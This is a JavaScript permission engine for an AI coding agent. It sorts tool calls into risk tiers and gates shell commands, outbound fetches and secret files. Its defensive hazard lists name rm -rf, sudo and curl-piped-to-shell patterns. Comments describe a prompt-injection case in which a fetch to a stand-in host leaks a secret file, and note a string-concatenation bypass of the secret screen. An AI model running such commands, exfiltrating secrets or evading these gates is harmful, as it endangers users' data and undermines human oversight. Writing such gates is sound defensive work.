// Who is allowed to touch what.
//
// The upstream model speaks in prose markers, so a "write" is any of
// CREATE/EDIT/DELETE/MOVE and "shell" is RUN. Reads are allowed by default —
// they cannot change anything, and holding the whole loop hostage to a question
// per file read would make the tool unusable — but a deny rule still outranks
// that default, because `.env* → deny` exists to keep secrets on this machine.
//
// The risk tiers, and what each one means:
//   read       — a read; allowed unless a rule denies it
//   write      — a mutation of the tree
//   shell      — a RUN; the mode decides
//   shell-risk — a RUN that looks destructive; a question in EVERY mode
//   exfil      — a tool that moves data OUT: FETCH, WEB, ATTACH
//
// `exfil` is the tier the others are not. A read cannot change anything, but
// a fetch can: the model writes the URL, the query string is its own, and
// `NEED secret.txt` followed by `FETCH https://elsewhere.example/x?t=…` sends
// the file to a third party without the person ever seeing the destination.
// ATTACH is the same primitive in another shape — it encodes a project file
// into the next outgoing message. So this tier asks in EVERY mode, yolo
// included: no mode pre-answers it, and the secret floor still denies a
// secret file whatever the answer was.
//
// Three modes, matching how the CLI already worked:
//   ask      — every write and every shell command is confirmed (dry run)
//   auto     — writes go through without asking; the shell is still a question
//              (the old `--apply`)
//   yolo     — writes and shell both go through (the old `--apply --allow-run`)
//
// On top of that: path rules (`docs/** → allow`, `.env* → deny`) that outrank
// the mode, and "always" answers so one confirmation covers a whole run.
import { SAFETY_RULES, SECRET_RULES } from './settings.mjs';
// The stored grant format and the shell shape live in harness/rules.mjs — one
// owner, so the engine and the file it writes can never disagree about what
// a grant covers.
import { grantCovers, commandShape } from './rules.mjs';
export const WRITE_KINDS = new Set(['write', 'replace', 'delete', 'move']);
export const SHELL_KINDS = new Set(['run']);
/** The tools that move data OUT of the machine to a place the MODEL chose.
 *
 *  FETCH is the one: the URL is the model's own, so a page the agent read can
 *  talk it into posting the project's contents to a third party, and the
 *  person watching would never see it happen. That is the prompt-injection
 *  exfiltration channel, and it is the one tool here whose DESTINATION is not
 *  fixed by the product.
 *
 *  WEB and ATTACH are not in it, for two different reasons that both point
 *  the same way: WEB goes to the product's own search, and ATTACH sends to the
 *  provider that already receives the whole conversation (the secret floor
 *  is what guards it). Neither lets the model pick where the data lands, and
 *  a tier that asked about them would ask about every search and every
 *  attachment — a question nobody would learn to answer. ATTACH is a WRITE
 *  instead: it changes what goes out, so ask mode asks about it.
 */
export const EXFIL_KINDS = new Set(['fetch']);

/** The tools that carry something out to a fixed place. A write, not a read:
 *  the file rides the next message, and the provider already receives the
 *  conversation, so the marginal risk is the file itself — a write is what
 *  that is. */
const OUTBOUND_WRITE_KINDS = new Set(['attach']);

/** kind → 'read' | 'write' | 'shell' | 'shell-risk' | 'exfil'. A RUN's command
 *  lives in `body`, never in `arg` (protocol.mjs), so the kind alone cannot
 *  tell an ordinary command from a destructive one — classifyRun reads the
 *  text. FETCH is 'exfil': the destination is the model's own, and no mode
 *  pre-answers it. */
export function classify(kind, body = '') {
  if (WRITE_KINDS.has(kind)) return 'write';
  if (SHELL_KINDS.has(kind)) return classifyRun(body);
  if (EXFIL_KINDS.has(kind)) return 'exfil';
  if (OUTBOUND_WRITE_KINDS.has(kind)) return 'write';
  // A plugin marker with no declared risk is not a read: its code runs in
  // this process with the harness's access, so it is classified like a write
  // until the plugin says otherwise.
  if (kind === 'plugin') return classifyPlugin(null);
  return 'read';
}

/**
 * The risk a plugin marker carries.
 *
 * A declared risk is the plugin's own word, and it is taken as given: 'read'
 * stays a read, 'write' and 'shell' ride the gate a built-in of that kind
 * rides. An undeclared one is classified like a write — the plugin's code has
 * the harness's access, and "nobody said" is not the same as "it only reads".
 * Trust is what a plugin asks for by name, not what it gets by silence.
 *
 * 'exfil' is not a word a plugin may declare: that tier names the built-ins
 * that carry data out (FETCH, WEB, ATTACH), and a marker is the plugin's own
 * code — it rides the write or the shell gate, which ask.
 */
export function classifyPlugin(risk) {
  if (risk === 'read' || risk === 'write' || risk === 'shell') return risk;
  return 'write';
}

/* ---------------------------------------------------------------- command risk
 *
 * RUN carries the command in `body` and `arg: ''` (protocol.mjs), so no path
 * rule can ever see it — before this, every command was 'shell' and yolo let
 * all of them through. The classifier below is deliberately shallow: a
 * first-word plus substring hazard list, not a shell grammar. Quoting,
 * wrappers and command substitution are not modelled, and a false positive is
 * the cheap side of that trade — it costs one question, where a false negative
 * costs the repository or the machine. 'shell-risk' means "ask in every mode,
 * yolo included"; 'shell' keeps whatever the mode says.
 */
const RUN_SPLIT = /[&;|`\r\n]+/;

// First words that are destructive or system-level on their own.
const HAZARD_FIRST = new Set([
  'format', 'shutdown', 'diskpart', 'reg',   // disk and system control
  'sudo', 'runas', 'doas', 'su',             // privilege escalation
]);

// The delete family, where the flags decide: `rm -rf`, `del /f /s /q`,
// `rmdir /s`, `Remove-Item -Recurse`. A plain `del notes.txt` is not a gate.
const DELETE_HAZARDS = {
  rm: (flags) => flags.some((f) => f === '--recursive' || /^-[a-z]*r[a-z]*$/i.test(f)),
  rmdir: (flags) => flags.includes('/s'),
  rd: (flags) => flags.includes('/s'),
  del: (flags) => flags.includes('/s'),
  erase: (flags) => flags.includes('/s'),
  'remove-item': (flags) => flags.includes('-recurse'),
};

// `curl … | sh` in every spelling: a download piped straight into an
// interpreter runs whatever the URL served.
const FETCHERS = new Set(['curl', 'wget', 'iwr', 'irm', 'invoke-webrequest', 'invoke-restmethod']);
const INTERPRETERS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'cmd', 'powershell', 'pwsh', 'iex', 'invoke-expression', 'node', 'python', 'python3', 'perl', 'ruby']);

// Git subcommands that write: history, refs, the working tree or the remote.
// Reads (status, diff, log, show, blame, rev-parse …) stay ordinary commands.
const GIT_WRITES = new Set(['push', 'commit', 'reset', 'clean', 'checkout', 'switch', 'restore', 'rebase', 'merge', 'cherry-pick', 'revert', 'am', 'apply', 'pull', 'rm', 'mv']);

// Shapes a wrapper can hide (`bash -c "rm -rf …"`), searched in the raw text
// because a first-word check cannot see inside a quoted payload.
const HAZARD_TEXT = /\brm\s+-\S*r\S*f|\brm\s+-\S*f\S*r|\bdel\b[^|&;]*\/s\b|\brmdir\b[^|&;]*\/s\b/i;

/** The bare command word: lowercased, quotes stripped, directory and .exe off. */
const commandWord = (segment) => {
  const first = segment.trim().replace(/^["']+/, '').split(/\s+/)[0] ?? '';
  return first.replace(/\\/g, '/').split('/').pop().replace(/\.exe$/i, '').toLowerCase();
};

const wordsOf = (segment) => segment.trim().replace(/^["']+/, '').toLowerCase().split(/\s+/).filter(Boolean);

/** Does this git invocation write? Global flags that take a value (-C dir,
 *  -c name=value) are skipped so the first bare word is the subcommand. */
function gitHazard(words) {
  let sub = '';
  let args = [];
  for (let i = 1; i < words.length; i++) {
    const w = words[i];
    if (w === '-c' || w === '-C') { i++; continue; }
    if (w.startsWith('-')) continue;
    sub = w;
    args = words.slice(i + 1);
    break;
  }
  if (GIT_WRITES.has(sub)) return true;
  // `branch` and `tag` list when they only carry listing flags; a name or a
  // mutation flag means create/rename/delete. `stash` saves unless it is told
  // to list or show.
  if (sub === 'branch' || sub === 'tag') {
    if (['-d', '-m', '-c', '-f', '--delete', '--move', '--force'].some((f) => args.includes(f))) return true;
    if (args.includes('-l') || args.includes('--list')) return false;
    return args.some((a) => !a.startsWith('-'));
  }
  if (sub === 'stash') {
    const first = args.find((a) => !a.startsWith('-'));
    return first !== 'list' && first !== 'show';
  }
  return false;
}

/** 'shell-risk' for a RUN body a person should confirm, 'shell' otherwise. */
export function classifyRun(body) {
  const text = String(body ?? '').toLowerCase();
  if (!text.trim()) return 'shell';
  if (HAZARD_TEXT.test(text)) return 'shell-risk';

  const segments = text.split(RUN_SPLIT).map((s) => s.trim()).filter(Boolean);
  for (let i = 0; i < segments.length; i++) {
    const cmd = commandWord(segments[i]);
    if (HAZARD_FIRST.has(cmd)) return 'shell-risk';
    const del = DELETE_HAZARDS[cmd];
    if (del && del(wordsOf(segments[i]).slice(1))) return 'shell-risk';
    // `… | sh` counts when a download fetched the input on the left.
    if (INTERPRETERS.has(cmd) && segments.slice(0, i).some((s) => FETCHERS.has(commandWord(s)))) return 'shell-risk';
    if (cmd === 'git' && gitHazard(wordsOf(segments[i]))) return 'shell-risk';
  }
  return 'shell';
}

/**
 * True when a RUN body asks git to commit. The same shallow parse classifyRun
 * uses: any segment counts (`git status && git commit` still commits), global
 * `-c`/`-C` values are skipped, and the first bare word after `git` is the
 * subcommand. The red-test commit gate (loop.mjs) keys off this one function,
 * so the gate and the risk classifier cannot drift apart.
 */
export function isGitCommit(body) {
  const text = String(body ?? '').toLowerCase();
  if (!text.trim()) return false;
  for (const segment of text.split(RUN_SPLIT).map((s) => s.trim()).filter(Boolean)) {
    if (commandWord(segment) !== 'git') continue;
    const words = wordsOf(segment);
    for (let i = 1; i < words.length; i++) {
      const w = words[i];
      if (w === '-c' || w === '-C') { i++; continue; }
      if (w.startsWith('-')) continue;
      if (w === 'commit') return true;
      break; // the first bare word is the subcommand; anything else is not a commit
    }
  }
  return false;
}

/** Minimal glob: `**` spans path separators, `*` does not. */
export function globMatch(pattern, text) {
  const re = new RegExp('^' + String(pattern)
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    .replace(/\*\*/g, '\u0000')
    .replace(/\*/g, '[^/]*')
    .replace(/\u0000/g, '.*') + '$', 'i');
  return re.test(text);
}

/* --------------------------------------------------------- the secret screen
 *
 * The file tools are covered by the floor in evaluate() — a NEED for `.env`
 * is denied before the mode is consulted. Three other channels used to walk
 * past it: a RUN carries its command in `body` (never in `arg`), a GIT can
 * name a path inside the repository (`show HEAD:.env`), and SEARCH read any
 * file whose name did not start with a dot. This is the one screen they
 * share: the same SECRET_RULES table, applied to the words a command spells.
 *
 * What this is not: a sandbox. A command that builds the name at runtime
 * (`node -e "readFileSync('.e'+'nv')"`) is arbitrary code and cannot be
 * screened — `allowRun` is the gate, and ask mode shows every command before
 * it runs. The screen stops the straight-line spellings; SECURITY.md says the
 * rest out loud.
 */

// A command line splits the way a shell sees it: whitespace plus the quoting
// and punctuation that can separate one word from the next. Splitting on
// `=`/`:` too peels `--env-file=.env` and repo refs like `HEAD:.env`; the
// backslash-to-slash normalization in secretHit keeps Windows paths whole.
const SECRET_TOKEN_SPLIT = /[\s'";&|<>()\[\]{}$`=:]+/;

/**
 * The first command word that matches a SECRET_RULES pattern, or null.
 * Matched with globMatch — the same way the floor matches a tool arg — so a
 * new secret pattern only ever needs to be added in one place.
 */
export function secretHit(text) {
  for (const token of String(text ?? '').replace(/\\/g, '/').split(SECRET_TOKEN_SPLIT)) {
    if (!token) continue;
    for (const rule of SECRET_RULES) {
      if (globMatch(rule.pattern, token)) return { token, pattern: rule.pattern };
    }
  }
  return null;
}

/**
 * Drop `git diff`-shaped chunks whose file is a secret. `git diff`, `git show`
 * and `git log -p` print the patch of anything committed — including a secret
 * file committed before the floor existed. The chunks are structured
 * (`diff --git a/<path> b/<path>`), so the scrub is surgical: every chunk
 * whose path is clean stays, the rest go, and the count is named rather than
 * pretending nothing was there.
 */
export function scrubSecretDiff(text) {
  const s = String(text ?? '');
  if (!s.includes('diff --git')) return s;
  let withheld = 0;
  const kept = s.split(/(?=^diff --git )/m).filter((chunk) => {
    const line = chunk.split('\n', 1)[0];
    if (!line.startsWith('diff --git ') || !secretHit(line)) return true;
    withheld++;
    return false;
  });
  if (!withheld) return s;
  return `${kept.join('')}\n[${withheld} diff${withheld > 1 ? 's' : ''} of a secret file withheld — it stays on this machine]`;
}

/* --------------------------------------------------------------- the grant key
 *
 * A remembered "always" is a grant, and a grant is keyed by the call it was
 * given for. For everything but a RUN the key is the argument — the file, the
 * marker name, the URL — and it says exactly what it covers. A RUN carries its
 * command in `body` and `arg: ''` (protocol.mjs), so the key was the constant
 * 'run:' for EVERY command: one "always" on `ls -la` authorised `rm -rf /`
 * after it, in this run and in every run after it (the grant is persisted —
 * harness/rules.mjs).
 *
 * A shell grant is therefore keyed by the command's SHAPE: the program, and
 * the word that decides what it does (`git push` is not `git status`). The
 * arguments a command carries are NOT part of the shape — a path, a URL or a
 * token would be written into the rules file, and the rules file is not where
 * a payload belongs.
 *
 * harness/rules.mjs owns the stored format AND the lookup: `grantCovers` and
 * `commandShape` are imported from it, so the engine and the file it writes
 * cannot disagree about what a grant covers. A shell grant's `arg` holds the
 * shape, and an empty one is the legacy blanket — which covers nothing,
 * because the safe reading of "always allow every command" is "ask again".
 */

/**
 * The grant a key stands for: `${kind}:${arg}`, split at the first colon.
 */
const grantOf = (key) => {
  const text = String(key);
  const at = text.indexOf(':');
  return at < 0 ? { kind: text, arg: '' } : { kind: text.slice(0, at), arg: text.slice(at + 1) };
};

export class PermissionEngine {
  /**
   * @param {object}   opts
   * @param {string}   opts.mode    'ask' | 'auto' | 'yolo'
   * @param {boolean}  opts.allowRun  shell is permitted at all
   * @param {Array}    opts.rules   [{pattern, decision, kinds?}]
   * @param {Function} opts.askFn   ({id, kind, arg, preview, risk}) => 'allow'|'deny'|'always'
   * @param {Function} [opts.onGrant] (kind, arg) => void — write-through when an
   *                                "always" answer is recorded, so it survives
   *                                a restart (harness/rules.mjs). For a shell
   *                                grant the argument is the command's shape.
   * @param {object}   opts.events  Emitter; `permission_request` goes out on it
   */
  constructor({ mode = 'ask', allowRun = false, allowExfil = false, rules = [], askFn = null, events = null, timeoutMs = 120_000, onGrant = null } = {}) {
    this.mode = mode;
    this.allowRun = allowRun;
    // A surface with no window to ask in says "yes" here instead — the CLI's
    // flags are its consent, the same way `--allow-run` is. The desktop leaves
    // it off, so a fetch the model invented is a question the person sees.
    this.allowExfil = allowExfil;
    this.rules = rules;
    this.askFn = askFn;
    this.events = events;
    this.timeoutMs = timeoutMs;
    this.onGrant = onGrant;
    this.grants = new Map();  // `${kind}:${arg}` → 'allow' (a shell grant's arg is its shape)
    this.pending = new Map(); // id → {resolve, kind, arg, body}
  }

  /** What the policy says, before any question is asked.
   *
   *  `risk` overrides the kind's own classification for callers that carry
   *  one of their own (a plugin marker with a risk declared at registration);
   *  everything below reads the same verdict either way.
   *
   *  `paths` are extra tokens to screen — the argument of a plugin marker,
   *  whose own name is not a path. `ruleKinds` are the kinds a rule may name
   *  to match this call: a plugin marker is one kind, but it is classified as
   *  a write or a shell, so the rules guarding those kinds have to reach it
   *  too. Without that a plugin would walk past the floor a built-in cannot.
   *
   *  `secretText` is a payload the call carries but its argument does not: a
   *  plugin marker's body. A built-in screens its own body (a RUN's command,
   *  tools.mjs) — a plugin cannot, because the harness never sees inside the
   *  plugin's code, and a plugin used as a proxy ("read .env for me") would
   *  carry the secret straight back to the model. So the same SECRET_RULES
   *  table and the same token split are applied here, in the one place that
   *  still can.
   */
  evaluate({ kind, arg = '', body = '', risk: riskOverride = null, paths = [], ruleKinds = null, secretText = '' }) {
    const risk = riskOverride ?? classify(kind, body);
    const kinds = ruleKinds ?? [kind];
    const named = (rule) => !rule.kinds || rule.kinds.some((k) => kinds.includes(k));
    // The extra tokens, split the way a shell would split them.
    const extra = (Array.isArray(paths) ? paths : [paths])
      .flatMap((p) => String(p ?? '').trim().split(/\s+/).filter(Boolean));
    // A hazardous RUN body is a question no mode pre-answers — yolo included.
    // It sits ahead of everything else, grants included: a destructive
    // command is asked about every time it appears, whatever an earlier
    // "always" was given for.
    if (risk === 'shell-risk') return { decision: 'ask', risk };

    // Path rules outrank the mode — and they cover reads too, because
    // `.env* → deny` is how secrets stay on this machine even when the model
    // asks for the file with NEED. First match wins.
    // EVERY token of the argument is screened, not only the first: a MOVE
    // names two paths, and the destination is the one a rule like
    // `dist/** → deny` was written to stop.
    const tokens = arg.trim().split(/\s+/).filter(Boolean);
    const file = tokens[0] ?? '';
    const screened = [...tokens, ...extra].filter(Boolean);
    for (const rule of this.rules) {
      if (!named(rule)) continue;
      if (screened.some((t) => globMatch(rule.pattern, t))) {
        return { decision: rule.decision, risk, reason: `rule ${rule.pattern}` };
      }
    }

    // The secret floor (settings.mjs SECRET_RULES) sits under the user's own
    // rules and over everything else: a secret file is denied in every mode,
    // yolo included, for reads AND writes. An explicit user `allow` above
    // still wins (operator override), and a user rule that names the file but
    // narrows `kinds` away from this kind also wins for this kind (H9: kinds
    // narrowing stays meaningful). Only silence — no user rule naming the
    // file at all — falls through to the floor.
    const secrets = [...new Set([...arg.trim().split(/\s+/).filter(Boolean), ...extra])];
    if (file && !secrets.includes(file)) secrets.unshift(file);
    const userScopedOut = (f) => this.rules.some((r) =>
      Array.isArray(r.kinds) && !r.kinds.some((k) => kinds.includes(k)) && globMatch(r.pattern, f));
    for (const rule of SECRET_RULES) {
      if (!named(rule)) continue;
      if (secrets.some((f) => !userScopedOut(f) && globMatch(rule.pattern, f))) {
        return { decision: rule.decision, risk, reason: `secret ${rule.pattern}` };
      }
    }

    // The payload the argument does not carry: a plugin marker's body. The
    // same table, the same split as a RUN's command — and the same override:
    // a user rule that names the file but narrows `kinds` away from this kind
    // still wins for this kind.
    if (secretText) {
      const hit = secretHit(secretText);
      if (hit && !userScopedOut(hit.token)) {
        return { decision: 'deny', risk, reason: `secret ${hit.pattern}` };
      }
    }

    // An "always" answer is remembered, and it is remembered FOREVER: the
    // grant is written to the rules file and re-seeded on every start. So it
    // sits UNDER the user's own rules and UNDER the secret floor — a rule the
    // person wrote later has to win over a grant they gave earlier (the
    // grant was checked first, and a `deny` rule that never took effect was
    // a rule that was not a rule), and a secret file stays denied in every
    // mode whatever the answer was once. It still beats the safety floor and
    // the mode below: "always" means always, and the safety floor exists to
    // make the FIRST mutation of a build file visible, not to re-ask forever.
    //
    // The lookup is `grantCovers`: a shell grant is compared by the command's
    // shape, so the constant 'run:' key of the old format — one "always" for
    // every command that ever runs — covers nothing, and the safe reading of
    // it is "ask again".
    if (risk !== 'read' && this.#granted(kind, arg, body)) return { decision: 'allow', risk, granted: true };

    // The safety floor (settings.mjs SAFETY_RULES) sits under the user's own
    // rules and over the mode: mutating a file a build resolves through is a
    // question even in yolo, because the mistake is invisible until something
    // else breaks. Reads never match — every rule carries mutation kinds only.
    // A MOVE names two paths and both are checked; a write names one.
    const files = [...new Set([...arg.trim().split(/\s+/).filter(Boolean), ...extra])];
    for (const rule of SAFETY_RULES) {
      if (!named(rule)) continue;
      if (files.some((f) => globMatch(rule.pattern, f))) {
        return { decision: rule.decision, risk, reason: `rule ${rule.pattern}` };
      }
    }

    // The tier that moves data OUT is a question no mode pre-answers — yolo
    // included. It sits under the floors above (a secret file stays denied
    // whatever the answer was) and under the grant (an "always" the person
    // gave for this exact argument is their own word), and over the mode
    // below: the destination is the model's own choice, so the person has to
    // see it before anything leaves the machine.
    if (risk === 'exfil') {
      return this.allowExfil ? { decision: 'allow', risk } : { decision: 'ask', risk };
    }

    // A read that no rule named is allowed: it cannot change anything.
    if (risk === 'read') return { decision: 'allow', risk };
    if (this.mode === 'yolo') return { decision: 'allow', risk };
    if (risk === 'write' && this.mode === 'auto') return { decision: 'allow', risk };
    // `auto` asks about a shell command: it is the mode that lets writes
    // through, not the one that lets the shell run unattended. `yolo` is the
    // mode for that, and `allowRun` only says the shell is permitted at all.
    return { decision: 'ask', risk };
  }

  /**
   * Is this call covered by a remembered "always"?
   *
   * The comparison is `grantCovers` — the contract harness/rules.mjs will
   * implement on the stored side. A shell grant is matched by the command's
   * shape, so the legacy blanket ('run:', no argument) covers nothing: the
   * safe reading of "always allow every command" is "ask again".
   */
  #granted(kind, arg, body) {
    // The engine holds a map of `${kind}:${arg}` → 'allow'; the lookup wants
    // the grants themselves, so the keys are read back into the shape the
    // stored format uses. The shell shape is the argument of a shell grant,
    // which is what the write-through below puts there.
    const grants = [...this.grants.keys()].map((key) => grantOf(key));
    return grantCovers(grants, kind, arg, body);
  }

  /**
   * Ask the human.
   *
   * `askFn` is an override for callers that already know the policy (tests).
   * The default path puts the question on the `permission_request` event and
   * waits for `answer()`. If nobody is listening there is no one to ask, so the
   * call is refused rather than hanging the run forever.
   */
  async request({ kind, arg = '', preview = '', body = '', risk: riskOverride = null, paths = [], ruleKinds = null, secretText = '' } = {}) {
    const risk = riskOverride ?? classify(kind, body);
    const verdict = this.evaluate({ kind, arg, body, risk: riskOverride, paths, ruleKinds, secretText });
    if (verdict.decision !== 'ask') return verdict.decision;

    if (this.askFn) {
      const answer = verdictFnAnswer(await this.askFn({ id: 'direct', kind, arg, preview, risk }));
      // An "always" given here records the grant HERE, where the command body
      // is still in hand: a shell grant is keyed by the command's shape, and
      // the body is what carries it.
      if (answer === 'always') this.grant(kind, arg, body);
      return answer;
    }

    if (!this.events?.isObserved('permission_request')) return 'deny';

    const id = Math.random().toString(16).slice(2, 10);
    const decided = new Promise((resolve) => this.pending.set(id, { resolve, kind, arg, risk, preview, body }));
    this.events.emit('permission_request', { id, kind, arg, preview, risk });

    // Nobody answered in time: refuse rather than hold the run open forever.
    const timer = this.timeoutMs > 0
      ? setTimeout(() => {
          const entry = this.pending.get(id);
          if (entry && this.pending.delete(id)) entry.resolve('deny');
        }, this.timeoutMs)
      : null;
    const decision = await decided;
    if (timer) clearTimeout(timer);
    return verdictFnAnswer(decision);
  }

  /**
   * Record an "always" grant so the same question is not asked again.
   *
   * A shell grant is keyed by the command's SHAPE (see commandShape), not by
   * the constant 'run:' every RUN used to share — one "always" on `ls -la`
   * would otherwise authorise every later command, in this run and in every
   * run after it. A shell grant with no shape to speak of is not recorded at
   * all: the legacy blanket means "every command, forever", which is the one
   * answer nobody can give by accident.
   */
  grant(kind, arg = '', body = '') {
    const shape = kind === 'run' ? commandShape(body) : null;
    if (shape !== null && !shape) return;
    const key = `${kind}:${shape ?? arg}`;
    this.grants.set(key, 'allow');
    this.onGrant?.(kind, shape ?? arg);
  }

  /** Called by the UI when the human answers a pending question. */
  answer(id, decision) {
    const entry = this.pending.get(id);
    if (!entry) return false;
    this.pending.delete(id);
    if (decision === 'always') this.grant(entry.kind, entry.arg, entry.body);
    entry.resolve(decision);
    return true;
  }

  pendingCount() { return this.pending.size; }

  /** The questions still waiting on the human, for a window that just reloaded.
   *  The risk and the preview ride along, so the reloaded window asks the
   *  same question the run asked — a plugin marker and the payload it was
   *  handed included, not a bare name. */
  pendingList() {
    return [...this.pending.entries()].map(([id, { kind, arg, risk, preview }]) => ({ id, kind, arg, risk, preview }));
  }

  /** A stop answers every open question as a deny — a run must not stay parked on a gate nobody will see. */
  cancelPending() {
    for (const [, entry] of this.pending) entry.resolve('deny');
    this.pending.clear();
  }
}

const verdictFnAnswer = (d) => (d === 'always' || d === 'allow-always' ? 'always' : d === 'allow' ? 'allow' : 'deny');
